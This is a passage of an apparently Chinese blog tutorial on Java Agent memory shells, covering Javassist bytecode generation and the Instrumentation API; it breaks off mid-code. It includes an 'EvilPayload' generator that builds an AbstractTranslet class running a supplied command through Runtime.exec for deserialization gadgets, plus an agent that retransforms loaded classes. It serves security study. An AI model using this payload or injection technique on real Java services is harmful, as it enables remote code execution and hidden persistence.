可能无法找到用户的类</strong>，因为Web服务器使用多个类加载器作为系统类加载器。在这种情况下，<strong>ClassPool 必须添加额外的类搜索路径</strong>。</p><p><code>cp.insertClassPath(new ClassClassPath(&lt;Class&gt;));</code></p><h5 id="CtClass"><a href="#CtClass" class="headerlink" title="CtClass"></a>CtClass</h5><p>可以将其理解成加强版的Class对象，我们可以通过CtClass对目标类进行各种操作。可以<code>ClassPool.get(ClassName)</code>中获取。</p><h5 id="CtMethod"><a href="#CtMethod" class="headerlink" title="CtMethod"></a>CtMethod</h5><p>同理，可以理解成加强版的<code>Method</code>对象。可通过<code>CtClass.getDeclaredMethod(MethodName)</code>获取，该类提供了一些方法以便我们能够直接修改方法体</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">CtMethod</span> <span class="keyword">extends</span> <span class="title class_">CtBehavior</span> &#123;</span><br><span class="line">    <span class="comment">// 主要的内容都在父类 CtBehavior 中</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 父类 CtBehavior</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">CtBehavior</span> <span class="keyword">extends</span> <span class="title class_">CtMember</span> &#123;</span><br><span class="line">    <span class="comment">// 设置方法体</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBody</span><span class="params">(String src)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 插入在方法体最前面</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertBefore</span><span class="params">(String src)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 插入在方法体最后面</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertAfter</span><span class="params">(String src)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 在方法体的某一行插入内容</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">insertAt</span><span class="params">(<span class="type">int</span> lineNum, String src)</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传递给方法 <code>insertBefore()</code> ，<code>insertAfter()</code> 和 <code>insertAt()</code> 的 String 对象<strong>是由<code>Javassist</code> 的编译器编译的</strong>。 由于编译器支持语言扩展，以 $ 开头的几个标识符有特殊的含义：</p><img src="/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/javassist.png" class><h5 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h5><p><strong>pom.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.27.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>创建测试类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> javassist;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Javassist_Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Create_Person</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取 CtClass 对象的容器 ClassPool</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个新类 Javassist.Learning.Person</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;javassist.Person&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个类属性 name</span></span><br><span class="line">        <span class="type">CtField</span> <span class="variable">ctField1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(classPool.get(<span class="string">&quot;java.lang.String&quot;</span>), <span class="string">&quot;name&quot;</span>, ctClass);</span><br><span class="line">        <span class="comment">//设置属性访问符</span></span><br><span class="line">        ctField1.setModifiers(Modifier.PRIVATE);</span><br><span class="line">        <span class="comment">//将 name 属性添加进 Person 中，并设置初始值为 Drunkbaby</span></span><br><span class="line">        ctClass.addField(ctField1, CtField.Initializer.constant(<span class="string">&quot;Drunkbaby&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//向 Person 类中添加 setter 和 getter</span></span><br><span class="line">        ctClass.addMethod(CtNewMethod.setter(<span class="string">&quot;setName&quot;</span>, ctField1));</span><br><span class="line">        ctClass.addMethod(CtNewMethod.getter(<span class="string">&quot;getName&quot;</span>, ctField1));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个无参构造</span></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">ctConstructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, ctClass);</span><br><span class="line">        <span class="comment">//设置方法体</span></span><br><span class="line">        ctConstructor.setBody(<span class="string">&quot;&#123;name = \&quot;Drunkbaby\&quot;;&#125;&quot;</span>);</span><br><span class="line">        <span class="comment">//向Person类中添加无参构造</span></span><br><span class="line">        ctClass.addConstructor(ctConstructor);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个类方法printName</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtMethod</span>(CtClass.voidType,<span class="string">&quot;printName&quot;</span>, <span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, ctClass);</span><br><span class="line">        <span class="comment">//设置方法访问符</span></span><br><span class="line">        ctMethod.setModifiers(Modifier.PRIVATE);</span><br><span class="line">        <span class="comment">//设置方法体</span></span><br><span class="line">        ctMethod.setBody(<span class="string">&quot;&#123;System.out.println(name);&#125;&quot;</span>);</span><br><span class="line">        <span class="comment">//将该方法添加进Person中</span></span><br><span class="line">        ctClass.addMethod(ctMethod);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将生成的字节码写入文件</span></span><br><span class="line">        ctClass.writeFile(<span class="string">&quot;E:\\Coding\\Java\\Java-Agent-Memshell\\Instrumentation\\src\\main\\java&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Create_Person();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>生成的 Person.class 如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> javassist;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;Drunkbaby&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String var1)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = var1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = <span class="string">&quot;Drunkbaby&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">printName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由此延展的攻击面其实是，我们可以利用 Javassist 生成一个恶意的 <code>.class</code> 类，其实在 CC 链的时候也是可以这样子打的，但是我当时并没有学习 Javassist 的思路，只是通过 Path.get 获取恶意类。</p><h5 id="使用-Javassist-生成恶意-class"><a href="#使用-Javassist-生成恶意-class" class="headerlink" title="使用 Javassist 生成恶意 class"></a>使用 Javassist 生成恶意 class</h5><p>由于我们的恶意类需要继承<code>AbstractTranslet</code>类，并重写两个<code>transform()</code>方法。否则编译无法通过，无法生成<code>.class</code>文件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">shell</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">shell</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var2) &#123;</span><br><span class="line">            var2.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是该恶意类在执行过程中并没有用到重写的方法，所以我们可以直接使用Javassist从字节码层面来生成恶意class，跳过恶意类的编译过程。代码如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> javassist;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.File;  </span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilPayload</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplatesImpl(String cmd) &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();  </span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);  </span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);  </span><br><span class="line">            ctClass.setSuperclass(superClass);  </span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();  </span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +  </span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);  </span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();  </span><br><span class="line">            ctClass.defrost();  </span><br><span class="line">            <span class="keyword">return</span> bytes;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">writeShell</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">byte</span>[] shell = EvilPayload.getTemplatesImpl(<span class="string">&quot;Calc&quot;</span>);  </span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;S&quot;</span>));  </span><br><span class="line">        fileOutputStream.write(shell);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        writeShell();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成的恶意文件被我们输出到了 <code>S</code> 这个文件中，其实很多反序列化在用的时候，是没有把这个字节码提取保存出来，本质上还是可以保存的。</p><p>保存出来的文件代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  </span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA  </span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)  </span></span><br><span class="line"><span class="comment">//  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;  </span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;Calc&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var1) &#123;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> &#123;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Instrumentation"><a href="#Instrumentation" class="headerlink" title="Instrumentation"></a>Instrumentation</h4><p>Instrumentation 是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent 通过这个类和目标 JVM 进行交互，从而达到修改数据的效果。</p><p>其在 Java 中是一个接口，常用方法如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Instrumentation</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer, <span class="type">boolean</span> canRetransform)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//删除一个类转换器</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">removeTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment">//在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">retransformClasses</span><span class="params">(Class&lt;?&gt;... classes)</span> <span class="keyword">throws</span> UnmodifiableClassException;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment">//判断一个类是否被修改</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isModifiableClass</span><span class="params">(Class&lt;?&gt; theClass)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 获取目标已经加载的类。</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class[] getAllLoadedClasses();</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//获取一个对象的大小</span></span><br><span class="line">    <span class="type">long</span> <span class="title function_">getObjectSize</span><span class="params">(Object objectToSize)</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="ClassFileTransformer"><a href="#ClassFileTransformer" class="headerlink" title="ClassFileTransformer"></a>ClassFileTransformer</h5><p>转换类文件，该接口下只有一个方法：transform，重写该方法即可转换任意类文件，并返回新的被取代的类文件，在 java agent 内存马中便是在该方法下重写恶意代码，从而修改原有类文件代码逻辑，与 addTransformer 搭配使用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。  </span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer, <span class="type">boolean</span> canRetransform)</span>;</span><br></pre></td></tr></table></figure><h5 id="获取目标-JVM-已加载类"><a href="#获取目标-JVM-已加载类" class="headerlink" title="获取目标 JVM 已加载类"></a>获取目标 JVM 已加载类</h5><p>下面我们简单实现一个能够获取目标 JVM 已加载类的 <code>agentmain-Agent</code></p><p>Main 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello_Sleep</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;  </span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;  </span><br><span class="line">            hello();  </span><br><span class="line">            sleep(<span class="number">3000</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span>&#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Agent 主类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">agentmain_transform</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String args, Instrumentation inst)</span> <span class="keyword">throws</span> InterruptedException, UnmodifiableClassException &#123;  </span><br><span class="line">        Class [] classes = inst.getAllLoadedClasses();  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//获取目标JVM加载的全部类  </span></span><br><span class="line">        <span class="keyword">for</span>(Class cls : classes)&#123;  </span><br><span class="line">            <span class="keyword">if</span> (cls.getName().equals(<span class="string">&quot;AgentShell.Sleep_Hello&quot;</span>))&#123;  </span><br><span class="line">  </span><br><span class="line">                <span class="comment">//添加一个transformer到Instrumentation，并重新触发目标类加载  </span></span><br><span class="line">                inst.addTransformer(<span class="keyword">new</span> <span class="title class_">Hello_Transform</span>(),<span class="literal">true</span>);  </span><br><span class="line">                inst.retransformClasses(cls);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Transformer 修改类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello_Transform</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">//获取CtClass 对象的容器 ClassPool            ClassPool classPool = ClassPool.getDefault();  </span></span><br><span class="line">  </span><br><span class="line">            <span class="comment">//添加额外的类搜索路径  </span></span><br><span class="line">            <span class="keyword">if</span> (classBeingRedefined != <span class="literal">null</span>) &#123;  </span><br><span class="line">                <span class="type">ClassClassPath</span> <span class="variable">ccp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(classBeingRedefined);  </span><br><span class="line">                classPool.insertClassPath(ccp);  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">//获取目标类  </span></span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span 